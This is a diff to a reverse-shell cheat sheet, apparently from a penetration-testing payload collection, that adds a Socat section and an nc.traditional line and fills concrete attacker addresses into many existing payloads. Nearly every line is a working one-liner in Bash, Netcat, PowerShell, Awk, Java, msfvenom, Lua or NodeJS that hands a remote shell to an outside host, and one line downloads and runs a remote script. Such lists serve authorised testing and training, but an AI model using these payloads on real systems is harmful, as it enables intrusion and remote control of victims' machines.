@@ -5,6 +5,7 @@
 * [Reverse Shell](#reverse-shell)
     * [Bash TCP](#bash-tcp)
     * [Bash UDP](#bash-udp)
+    * [Socat](#socat)
     * [Perl](#perl)
     * [Python](#python)
     * [PHP](#php)
@@ -49,6 +50,15 @@ sh -i >& /dev/udp/127.0.0.1/4242 0>&1
 Listener:
 nc -u -lvp 4242
 ```
+
+### Socat
+
+```powershell
+user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
+user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+```
+
+Static socat binary can be found at [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
 
 ### Perl
 
@@ -118,12 +128,13 @@ echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","
 
 ```bash
 nc -e /bin/sh [IPADDR] [PORT]
+nc.traditional -e /bin/bash 10.0.0.1 4444
 ```
 
 ### Netcat OpenBsd
 
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
 ```
 
 ### Ncat
@@ -147,11 +158,11 @@ user@company$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet 
 ### Powershell
 
 ```powershell
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[IPADDR]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
 ```powershell
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.1.3.40',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
 ```powershell
@@ -161,21 +172,21 @@ powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubuse
 ### Awk
 
 ```powershell
-awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1>/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
 
 ### Java
 
 ```java
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
 
 ### War
 
 ```java
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
 strings reverse.war | grep jsp # in order to get the name of the file
 ```
 
@@ -185,13 +196,13 @@ strings reverse.war | grep jsp # in order to get the name of the file
 Linux only
 
 ```powershell
-lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 ```
 
 Windows and Linux
 
 ```powershell
-lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+lua5.1 -e 'local host, port = "10.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
 
 ### NodeJS
@@ -202,7 +213,7 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
     var client = new net.Socket();
-    client.connect(8080, "10.17.26.64", function(){
+    client.connect(4242, "10.0.0.1", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
@@ -213,12 +224,12 @@ lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket")
 
 or
 
-require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
+require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')
 
 or
 
 -var x = global.process.mainModule.require
--x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')
+-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')
 
 or
 
